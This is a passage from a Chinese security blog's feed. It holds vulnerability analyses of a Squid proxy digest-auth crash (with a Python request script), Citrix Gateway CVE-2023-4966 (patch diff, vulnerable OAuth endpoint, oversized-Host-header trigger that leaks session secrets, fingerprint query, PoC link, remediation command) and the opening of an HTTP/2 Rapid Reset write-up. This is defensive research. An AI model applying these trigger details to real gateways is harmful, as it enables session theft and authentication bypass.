&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ha1 &lt;span style="color:#f92672">=&lt;/span> hashlib&lt;span style="color:#f92672">.&lt;/span>md5((username &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> realm &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> password)&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))&lt;span style="color:#f92672">.&lt;/span>hexdigest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ha2&lt;span style="color:#f92672">=&lt;/span> hashlib&lt;span style="color:#f92672">.&lt;/span>md5(&lt;span style="color:#e6db74">&amp;#34;GET:/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#34;utf-8&amp;#34;&lt;/span>))&lt;span style="color:#f92672">.&lt;/span>hexdigest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>resp &lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://116.62.202.230&amp;#34;&lt;/span>,proxies&lt;span style="color:#f92672">=&lt;/span>proxies,verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> resp&lt;span style="color:#f92672">.&lt;/span>status_code&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">407&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resp_header &lt;span style="color:#f92672">=&lt;/span> resp&lt;span style="color:#f92672">.&lt;/span>headers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nonce &lt;span style="color:#f92672">=&lt;/span> resp_header[&lt;span style="color:#e6db74">&amp;#34;Proxy-Authenticate&amp;#34;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;=&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>rstrip(&lt;span style="color:#e6db74">&amp;#39;&amp;#34;&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>lstrip(&lt;span style="color:#e6db74">&amp;#39;&amp;#34;&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>response &lt;span style="color:#f92672">=&lt;/span> hashlib&lt;span style="color:#f92672">.&lt;/span>md5((ha1&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>nonce&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>nc&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>cnonce&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;:auth:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>ha2)&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))&lt;span style="color:#f92672">.&lt;/span>hexdigest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;nonce: &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">cnonce: &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">response: &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(nonce,cnonce,response))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rdata &lt;span style="color:#f92672">=&lt;/span> data&lt;span style="color:#f92672">.&lt;/span>format(username&lt;span style="color:#f92672">=&lt;/span>username,realm&lt;span style="color:#f92672">=&lt;/span>realm,nonce&lt;span style="color:#f92672">=&lt;/span>nonce,uri&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>,cnonce&lt;span style="color:#f92672">=&lt;/span>cnonce,nc&lt;span style="color:#f92672">=&lt;/span>nc,response&lt;span style="color:#f92672">=&lt;/span>response)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>header &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Proxy-Authorization&amp;#34;&lt;/span>: rdata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(rdata)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>resp &lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://116.62.202.230&amp;#34;&lt;/span>,proxies&lt;span style="color:#f92672">=&lt;/span>proxies,verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>,headers&lt;span style="color:#f92672">=&lt;/span>header)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(resp&lt;span style="color:#f92672">.&lt;/span>status_code,resp&lt;span style="color:#f92672">.&lt;/span>text)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>由于squid为多进程架构，在子进程因为漏洞退出时，父进程会重新生成子进程处理代理请求，实际利用比较鸡肋，也就不难理解该漏洞没有CVE编号了。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g" target="_blank">https://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://datatracker.ietf.org/doc/html/rfc7616" target="_blank">https://datatracker.ietf.org/doc/html/rfc7616&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-10-26T10:41:55+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/</link><pubDate>Thu, 26 Oct 2023 10:18:12 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Citrix中存在信息泄露漏洞，由于越界读取，未经授权的攻击者可以利用该漏洞获取到存储在内存的密钥。&lt;/p>
&lt;p>该漏洞在八月下旬观察到在野利用。&lt;/p>
&lt;p>&lt;strong>其他&lt;/strong>&lt;/p>
&lt;p>这个漏洞在10.19就已经分析完了，当时扫描了一下公网受影响服务器发现影响比较大，所以没有公开详情，在昨天国外安全研究员公开了PoC，所以现在才写分析文章。&lt;/p>
&lt;h4 id="指纹">指纹&lt;/h4>
&lt;p>hunter&lt;/p>
&lt;pre tabindex="0">&lt;code>web.title=&amp;#34;Citrix Gateway&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;ul>
&lt;li>NetScaler ADC and NetScaler Gateway 14.1 &amp;lt; 14.1-8.50&lt;/li>
&lt;li>NetScaler ADC and NetScaler Gateway 13.1 &amp;lt; 13.1-49.15&lt;/li>
&lt;li>NetScaler ADC and NetScaler Gateway 13.0 &amp;lt; 13.0-92.19&lt;/li>
&lt;li>NetScaler ADC 13.1-FIPS &amp;lt; 13.1-37.164&lt;/li>
&lt;li>NetScaler ADC 12.1-FIPS &amp;lt; 12.1-55.300&lt;/li>
&lt;li>NetScaler ADC 12.1-NDcPP &amp;lt; 12.1-55.300&lt;/li>
&lt;/ul>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>参照
&lt;a href="https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/">CVE-2023-3519 Citrix Gateway RCE&lt;/a>搭建&lt;/p>
&lt;ul>
&lt;li>
&lt;p>14.1-4.42
192.168.52.100&lt;/p>
&lt;/li>
&lt;li>
&lt;p>14.1-8.50
192.168.52.105&lt;/p>
&lt;/li>
&lt;li>
&lt;p>13.1-49.15
192.168.52.95&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>初步分析&lt;/strong>&lt;/p>
&lt;p>根据
&lt;a href="https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967" target="_blank">官方通告&lt;/a>可知两个漏洞都是对内存的操作不当造成的。对应的CVSS3分别如下&lt;/p>
&lt;ul>
&lt;li>CVE-2023-4966
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L&lt;/li>
&lt;li>CVE-2023-4967
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H&lt;/li>
&lt;/ul>
&lt;p>综合可以知道如下信息：
利用漏洞无需权限、使用网络请求即可利用、均为内存型漏洞，应该跟[[CVE-2023-3519 Citrix Gateway RCE|CVE-2023-3519)类似，对用户输入没做校验，其中CVE-2023-4966 应该是实现了越界读取内存。
&lt;img alt="1" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/3.png" />&lt;/p>
&lt;h4 id="函数diff">函数diff&lt;/h4>
&lt;p>diff nsppe文件，分析各个函数修改的地方。&lt;/p>
&lt;p>
&lt;img alt="2" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/1.png" />&lt;/p>
&lt;p>在逐个分析各个函数之后，目光转到&lt;code>ns_aaa_oauth_send_openid_config&lt;/code>函数。&lt;/p>
&lt;p>在补丁中 &lt;code>ns_aaa_oauth_send_openid_config&lt;/code>中对snprintf的返回值做了判断，在修复之前直接将snpritf的返回值放到了ns_vpn_send_response中，修复之后先判断返回值是否大于1FFFF。&lt;/p>
&lt;p>snprintf将格式化的数据，写入内存中，原型为&lt;code>int snprintf(char *str, int n, char * format [, argument, ...]);&lt;/code>，其中n为要写入的字符串的最大长度，snprintf最多会给内存写入n-1个字符，最后一个字符使用&lt;code>'\0'&lt;/code>，当要格式化后的字符串大于n时，会在n-1处截断。但此时，snprintf会返回格式化字符串的长度，而不是写入内存的长度。&lt;/p>
&lt;p>
&lt;img alt="3" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/2.png" />
&lt;img alt="4" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/4.png" />&lt;/p>
&lt;p>向上追溯调用栈，&lt;code>ns_aaa_oauth_send_openid_config&lt;/code>被 &lt;code>ns_vpn_process_unauthenticated_request&lt;/code>调用，将 &lt;code>ns_vpn_process_unauthenticated_request&lt;/code> 代码给AI分析调用到该函数的路径，可知调用路径为 &lt;code>/oauth/idp/.well-known/openid-configuration&lt;/code>
&lt;img alt="5" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/18.png" />&lt;/p>
&lt;p>此处猜测未修复版本中会使用snprintf的返回值作为长度参数进行读取。
curl请求该接口，可以看到响应中中会把我们请求的host放进去&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -i -s -k -X &lt;span style="color:#e6db74">$&amp;#39;GET&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Host: curl.test.site&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Accept-Encoding: gzip, deflate&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Upgrade-Insecure-Requests: 1&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Sec-Fetch-Dest: document&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Sec-Fetch-Mode: navigate&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Sec-Fetch-Site: none&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Sec-Fetch-User: ?1&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Te: trailers&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">$&amp;#39;Connection: close&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">$&amp;#39;NSC_TASS=/menu/neo&amp;#39;&lt;/span> &lt;span style="color:#e6db74">$&amp;#39;https://192.168.52.234/oauth/idp/.well-known/openid-configuration&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HTTP/1.1 &lt;span style="color:#ae81ff">200&lt;/span> OK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Content-Type-Options: nosniff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-XSS-Protection: 1; mode&lt;span style="color:#f92672">=&lt;/span>block
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: &lt;span style="color:#ae81ff">717&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-control: no-cache, no-store, must-revalidate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Pragma: no-cache
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/json; charset&lt;span style="color:#f92672">=&lt;/span>utf-8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Citrix-Application: Receiver &lt;span style="color:#66d9ef">for&lt;/span> Web
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;issuer&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://curl.test.site&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;authorization_endpoint&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://curl.test.site/oauth/idp/login&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;token_endpoint&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://curl.test.site/oaut
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">h/idp/token&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;jwks_uri&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://curl.test.site/oauth/idp/certs&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;response_types_supported&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;code&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;token&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;id_token&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;id_token_signing_alg_va
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">lues_supported&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;RS256&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;end_session_endpoint&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://curl.test.site/oauth/idp/logout&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;frontchannel_logout_supported&amp;#34;&lt;/span>: true, &lt;span style="color:#e6db74">&amp;#34;scopes_supported
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;openid&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;ctxs_cc&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;claims_supported&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;sub&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;iss&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;aud&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;exp&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;iat&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;auth_time&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;acr&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;amr&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;email&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;given_name&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;family_name&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;nic
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">kname&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;userinfo_endpoint&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://curl.test.site/oauth/idp/userinfo&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;subject_types_supported&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;public&amp;#34;&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前面知道print_temp_rule大小为0x20000，返回值中共有6处重复了host，所以我们传入的host长度&amp;gt;21845(粗略估计)就可以触发溢出。再次请求，发现可以利用超长host读取到Citrix内存，实际测试发现host长度最多到24100左右。&lt;/p>
&lt;p>
&lt;img alt="6" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/15.png" />&lt;/p>
&lt;p>借助这个漏洞，写了一个nuclei模板对公网扫描，对八百个独立IP扫描，截止至10.20，仍然有大约15%未修复，且通过这个漏洞可以读取到内存中的secret，后续可以借助这个secret绕过身份验证，请求后端接口。&lt;/p>
&lt;p>这个接口也在oauth的配置中有提到
&lt;a href="https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp" target="_blank">https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp&lt;/a>&lt;/p>
&lt;p>
&lt;img alt="7" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/20.png" />&lt;/p>
&lt;p>ns_aaa_oauthrp_send_openid_config函数类似，也snprintf的返回值做了判断。
&lt;img alt="8" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/5.png" />&lt;/p>
&lt;p>&lt;strong>调试&lt;/strong>&lt;/p>
&lt;p>关闭看门狗对nsppe进程发送的信号，而后直接在对应位置处下断点即可。&lt;/p>
&lt;pre tabindex="0">&lt;code>root@citrix3# nspf help
Usage: &amp;#39;/netscaler/nspf ((&amp;lt;process_name&amp;gt; | &amp;lt;pid&amp;gt;) &amp;lt;action&amp;gt; | query)&amp;#39;
where &amp;lt;process_name&amp;gt; is one of:
NSPPE-00 aslearn awsconfig bgpd de
imi isisd metricscollectomonuploadd nsaaad
nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd
nscopo nsfsyncd nsgslbautosyncnslcd nslped
nsm nsnetsvc nsrised nstraceaggregatnsumond
ospf6d ospfd ptpd ripd ripngd
snmpd syshealthd
root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0
nspf NSPPE-00 pbmonitor 0
Removing pitboss monitor on process NSPPE-00 pid 37387
&lt;/code>&lt;/pre>&lt;p>PoC&lt;/p>
&lt;pre tabindex="0">&lt;code>https://github.com/Chestnuts4/POC/blob/master/nuclei_poc/CVE-2023-4966_citrix_info_disclose.yaml
&lt;/code>&lt;/pre>&lt;p>&lt;strong>实际利用&lt;/strong>&lt;/p>
&lt;p>通过漏洞可以读取到内存中的已登录会话的secret。&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>该漏洞整体分析、利用较为简单， 通过朴实无华的越界读取即可造成信息泄露，也无需进行内存布局。其实整体看nsppe，很多使用了snprintf的地方都对其返回值进行了判断，本次漏洞点没有对返回值做判断可能是因为开发时遗漏了。&lt;/p>
&lt;p>另外即使修复该漏洞之后，已被劫持的会话仍然有效，需要使用如下命令清除已登录的会话&lt;/p>
&lt;pre tabindex="0">&lt;code>clar lb persistentSessions &amp;lt;vServer&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967" target="_blank">https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp" target="_blank">https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.citrix.com/downloads/citrix-adc/" target="_blank">https://www.citrix.com/downloads/citrix-adc/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-10-26T10:18:12+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</link><pubDate>Fri, 13 Oct 2023 15:11:25 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>利用 HTTP/2 的多路复用流功能，恶意攻击者可通过快速创建请求并立即重置请求，绕过最大并发流限制，导致服务器资源的过度消耗。&lt;/p>
&lt;h3 id="影响范围">影响范围&lt;/h3>
&lt;p>Go &amp;lt; 1.21.3
Go &amp;lt; 1.20.10&lt;/p>
&lt;hr>
&lt;p>11.0.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 11.0.0-M11
10.1.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 10.1.13
9.0.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 9.0.80
8.5.0 &amp;lt;= Apache Tomcat &amp;lt;= 8.5.9&lt;/p>
&lt;hr>
&lt;p>grpc-go &amp;lt; 1.58.3
grpc-go &amp;lt; 1.57.1
grpc-go &amp;lt; 1.56.3&lt;/p>
&lt;hr>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>使用go起一个http2 server。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">HandleFunc&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">func&lt;/span>(&lt;span style="color:#a6e22e">w&lt;/span> &lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">ResponseWriter&lt;/span>, &lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">Request&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fmt&lt;/span>.&lt;span style="color:#a6e22e">Println&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">Proto&lt;/span>, &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">URL&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fmt&lt;/span>.&lt;span style="color:#a6e22e">Fprint&lt;/span>(&lt;span style="color:#a6e22e">w&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Hello World!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> })
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">ListenAndServeTLS&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;:443&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;certs/cert.pem&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;certs/key.pem&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">nil&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用curl测试是否成功 &lt;code>curl https://localhost -i -k --http2 -vvv&lt;/code>。也可以使用nginx搭建一个http2服务器，配置很多博客都有就不写了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">➜ http curl https://localhost -i -k --http2 -vvv
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* Trying 127.0.0.1:443...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* Connected to localhost (127.0.0.1) port 443 (#0)
